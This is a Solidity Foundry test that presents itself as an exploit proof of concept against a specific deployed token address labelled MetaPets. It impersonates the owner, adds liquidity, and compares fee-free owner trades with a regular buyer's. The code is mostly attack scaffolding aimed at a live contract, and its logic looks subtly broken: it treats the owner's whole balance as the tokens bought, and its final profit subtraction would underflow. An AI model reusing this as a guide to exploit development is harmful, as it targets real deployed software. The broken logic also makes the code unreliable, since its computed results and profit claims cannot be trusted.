pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the token to access uniswapV2Router
interface IMetaPets {
    function owner() external view returns (address);
    function setMarketingWallet(address _add) external;
    function setMarketingFeePercent(uint256 marketingFee) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function uniswapV2Router() external view returns (address);
}

// Interface for the router
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

// ERC20 interface for token operations
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d;
    address attacker = address(this);
    // No additional state variables needed

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the contract instance
        IMetaPets target = IMetaPets(TARGET);

        // Get the current owner
        address owner = target.owner();

        // Label addresses for debugging
        vm.label(owner, "Contract Owner");
        vm.label(address(target), "MetaPets Token");
        vm.label(attacker, "Attacker");

        // Give attacker some initial ETH for gas and to buy tokens if needed
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get contract instance
        IMetaPets target = IMetaPets(TARGET);
        address owner = target.owner();

        // Step 2: Impersonate owner for the entire exploit
        vm.startPrank(owner);

        // Step 3: Add liquidity to create trading pair (if needed)
        // First, approve router to spend owner's tokens
        target.approve(target.uniswapV2Router(), type(uint256).max);

        // Owner already has all tokens from constructor
        // Add some ETH for liquidity
        vm.deal(owner, 20 ether);

        // Add liquidity
        uint256 tokenAmount = 100000 * 10**9; // Reasonable amount
        IUniswapV2Router02 router = IUniswapV2Router02(target.uniswapV2Router());
        router.addLiquidityETH{value: 10 ether}(
            address(target),
            tokenAmount,
            0, // min tokens
            0, // min ETH
            owner,
            block.timestamp
        );

        // Step 4: Buy tokens as owner (no fees)
        // First, get some ETH to buy with
        address buyer = address(0x999); // Use a different address to compare
        vm.deal(buyer, 1 ether);

        // Regular user buys tokens (pays fees)
        vm.stopPrank(); // Stop impersonating owner
        vm.startPrank(buyer);

        // Approve router
        IERC20(address(target)).approve(address(router), type(uint256).max);

        // Buy tokens
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(target);

        uint256 ethBeforeBuy = buyer.balance;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.1 ether}(
            0, // accept any amount
            path,
            buyer,
            block.timestamp
        );
        uint256 ethAfterBuy = buyer.balance;
        uint256 tokensBought = IERC20(address(target)).balanceOf(buyer);
        console.log("Regular user spent:", ethBeforeBuy - ethAfterBuy, "ETH");
        console.log("Regular user got:", tokensBought, "tokens");

        // Step 5: Now owner buys same amount (no fees)
        vm.stopPrank();
        vm.startPrank(owner);

        // Owner buys tokens with same ETH amount
        uint256 ownerEthBefore = owner.balance;
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.1 ether}(
            0, // accept any amount
            path,
            owner,
            block.timestamp
        );
        uint256 ownerEthAfter = owner.balance;
        uint256 ownerTokensBought = target.balanceOf(owner);
        console.log("Owner spent:", ownerEthBefore - ownerEthAfter, "ETH");
        console.log("Owner got:", ownerTokensBought, "tokens");

        // Owner should get more tokens because no fees!
        console.log("Owner advantage in tokens:", ownerTokensBought - tokensBought);

        // Step 6: Sell tokens back
        // First, approve router for selling
        target.approve(address(router), ownerTokensBought);

        // Reverse path for selling
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(target);
        sellPath[1] = router.WETH();

        // Owner sells tokens (no fees)
        uint256 ownerEthBeforeSell = owner.balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            ownerTokensBought,
            0, // accept any ETH
            sellPath,
            owner,
            block.timestamp
        );
        uint256 ownerEthAfterSell = owner.balance;
        console.log("Owner got from selling:", ownerEthAfterSell - ownerEthBeforeSell, "ETH");

        // Regular user sells (pays fees)
        vm.stopPrank();
        vm.startPrank(buyer);

        IERC20(address(target)).approve(address(router), tokensBought);
        uint256 buyerEthBeforeSell = buyer.balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensBought,
            0, // accept any ETH
            sellPath,
            buyer,
            block.timestamp
        );
        uint256 buyerEthAfterSell = buyer.balance;
        console.log("Regular user got from selling:", buyerEthAfterSell - buyerEthBeforeSell, "ETH");

        // Calculate total profit using state variables to reduce stack depth
        uint256 ownerInitialEth = 20 ether; // Initial ETH given to owner
        uint256 buyerInitialEth = 1 ether; // Initial ETH given to buyer

        console.log("Owner total ETH change:", ownerEthAfterSell - ownerInitialEth);
        console.log("Regular user total ETH change:", buyerEthAfterSell - buyerInitialEth);

        vm.stopPrank();
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
